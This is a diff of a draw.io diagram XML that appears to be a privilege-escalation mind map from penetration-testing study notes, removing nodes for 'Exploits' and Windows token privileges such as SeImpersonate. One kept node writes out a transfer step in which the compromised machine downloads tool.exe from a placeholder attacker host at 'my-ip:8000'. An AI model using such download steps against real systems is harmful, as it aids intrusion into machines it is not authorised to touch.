@@ -1300,9 +1300,6 @@
         <mxCell id="sli6TIqKNSMXCn56WrA1-6" edge="1" parent="1" source="eydW96J8nSPCopO3k54l-3" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" target="-vnwHSd8MJSs5UrJir6d-22">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="sli6TIqKNSMXCn56WrA1-7" edge="1" parent="1" source="eydW96J8nSPCopO3k54l-3" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" target="-vnwHSd8MJSs5UrJir6d-23">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-3" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="On scan la machine&lt;br&gt;winPEAS" vertex="1">
           <mxGeometry height="60" width="120" x="190" y="150" as="geometry" />
         </mxCell>
@@ -1322,14 +1319,6 @@
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-5" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote: iwr -uri http://my-ip:8000/&lt;/font&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;&lt;/div&gt;" vertex="1">
           <mxGeometry height="110" width="240" x="-310" y="195" as="geometry" />
-        </mxCell>
-        <mxCell id="jzq9HZ4WNqnn6DcPguP3-4" edge="1" parent="1" source="qmehafYx0e8W1bQMVf-2-1" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="870" y="458.25" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
-        <mxCell id="qmehafYx0e8W1bQMVf-2-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;SEImpersonate Privilege&amp;nbsp;&lt;/div&gt;&lt;div&gt;OR &lt;br&gt;&lt;div&gt;SeBackupPrivilege&lt;br&gt;SeAssignPrimaryToken&lt;br&gt;SeLoadDriver&lt;br&gt;SeDebug&lt;/div&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="95" width="190" x="640" y="410.75" as="geometry" />
         </mxCell>
         <mxCell id="-vnwHSd8MJSs5UrJir6d-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="Linux" vertex="1">
           <mxGeometry height="60" width="120" x="40" y="580" as="geometry" />
@@ -1405,12 +1394,6 @@
         </mxCell>
         <mxCell id="-vnwHSd8MJSs5UrJir6d-22" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="Scheduled tasks" vertex="1">
           <mxGeometry height="50" width="177.5" x="390" y="240" as="geometry" />
-        </mxCell>
-        <mxCell id="sli6TIqKNSMXCn56WrA1-8" edge="1" parent="1" source="-vnwHSd8MJSs5UrJir6d-23" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" target="qmehafYx0e8W1bQMVf-2-1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="-vnwHSd8MJSs5UrJir6d-23" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="Exploits" vertex="1">
-          <mxGeometry height="50" width="177.5" x="381.25" y="433.25" as="geometry" />
         </mxCell>
         <mxCell id="KbV5osIUXq8xYqzZ2qIY-5" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffbe6f;strokeColor=#ffbe6f;fontColor=#ffffff;" value="&lt;div&gt;&lt;b&gt;Another user&lt;em&gt;&lt;br&gt;&lt;/em&gt;&lt;/b&gt;&lt;/div&gt;" vertex="1">
           <mxGeometry height="70" width="180" x="1140" y="255" as="geometry" />
